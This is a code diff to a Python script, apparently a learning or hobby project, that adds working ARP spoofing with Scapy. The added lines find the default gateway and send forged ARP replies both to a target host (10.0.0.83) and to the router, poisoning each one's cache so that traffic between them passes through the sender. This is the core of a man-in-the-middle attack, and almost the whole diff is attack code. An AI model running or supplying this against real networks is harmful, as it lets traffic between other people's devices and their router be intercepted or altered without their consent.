@@ -35,8 +35,23 @@ def send_spoof_packet(target_ip, spoof_ip):
     """
 
     target_mac = get_mac(target_ip)
+    print(f"Target mac: {target_mac}")
 
-    print(target_mac)
 
+    # Poison the router ARP cache
+    # op = 2; this is an answer, not a request
+    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 
-send_spoof_packet("10.0.0.83", "10.0.0.83")
+    # Send packet to network
+    scapy.send(arp_packet, verbose=False)
+
+from scapy.all import conf
+
+# Get default route
+default_route = conf.route.route("0.0.0.0")
+gateway_ip = default_route[2]
+print(f"Router IP: {gateway_ip}")
+
+send_spoof_packet("10.0.0.83", gateway_ip)
+
+send_spoof_packet(gateway_ip, "10.0.0.83")
